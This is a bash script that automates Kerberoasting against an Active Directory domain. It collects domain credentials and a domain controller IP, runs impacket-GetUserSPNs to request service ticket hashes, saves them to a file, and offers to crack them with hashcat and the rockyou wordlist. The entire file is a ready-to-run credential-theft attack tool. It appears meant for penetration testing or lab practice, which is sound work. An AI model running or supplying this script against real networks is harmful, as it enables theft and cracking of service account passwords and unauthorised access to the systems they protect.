#!/bin/bash

# Color setup
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

echo -e "${CYAN}=============================================="
echo "           KERBEROASTING Automation           "
echo -e "==============================================${NC}\n"

# Get user inputs
read -p "Enter domain (e.g., fake.local): " domain
read -p "Enter username (e.g., dtsarouchas): " username
read -p "Enter password (special characters will be escaped automatically): " password
read -p "Enter domain controller IP (e.g., 192.168.242.139): " dc_ip

# Check if IP is reachable
echo -e "\n${YELLOW}Checking connection to Domain Controller...${NC}"
if ping -c 1 -W 2 "$dc_ip" &> /dev/null; then
    echo -e "${CYAN}Domain Controller is reachable.${NC}"
else
    echo -e "${YELLOW}Domain Controller is NOT reachable at $dc_ip. Please check the IP and network.${NC}"
    exit 1
fi

# Escape special characters in password
escaped_password=$(sed 's/[][\!*.^$\/#&@]/\\&/g' <<< "$password")

# Prepare output file name
output_file="kerberoast.txt"

# Show full command
echo -e "\n${YELLOW}This is the command that will be executed:${NC}"
echo "impacket-GetUserSPNs ${domain}/${username}:${escaped_password} -dc-ip ${dc_ip} -request | tee -a ${output_file}"

# Ask user to proceed
read -p "Do you want to run this command now? (y/n): " confirm

if [[ "$confirm" =~ ^[Yy]$ ]]; then
    timeout 60s impacket-GetUserSPNs "${domain}/${username}:${escaped_password}" -dc-ip "${dc_ip}" -request | tee -a "${output_file}"

    echo -e "\n${CYAN}Command execution completed.${NC}"

    # Check if any hashes found
    if grep -q "\$krb5tgs\$" "$output_file"; then
        echo -e "\n${YELLOW}Kerberoast hashes found in ${output_file}.${NC}"
        read -p "Do you want to crack them now with hashcat? (y/n): " crack_confirm

        if [[ "$crack_confirm" =~ ^[Yy]$ ]]; then
            hashcat -m 13100 -a 0 -o cracked_kerberoast.txt "$output_file" /usr/share/wordlists/rockyou.txt
            echo -e "\n${CYAN}Hashcat cracking finished.${NC}"
            echo -e "${YELLOW}Cracked hashes saved in cracked_kerberoast.txt${NC}"
        else
            echo -e "${YELLOW}Skipping hashcat cracking.${NC}"
        fi
    else
        echo -e "${YELLOW}No hashes found in ${output_file}.${NC}"
    fi
else
    echo -e "${YELLOW}Command not executed.${NC}"
fi

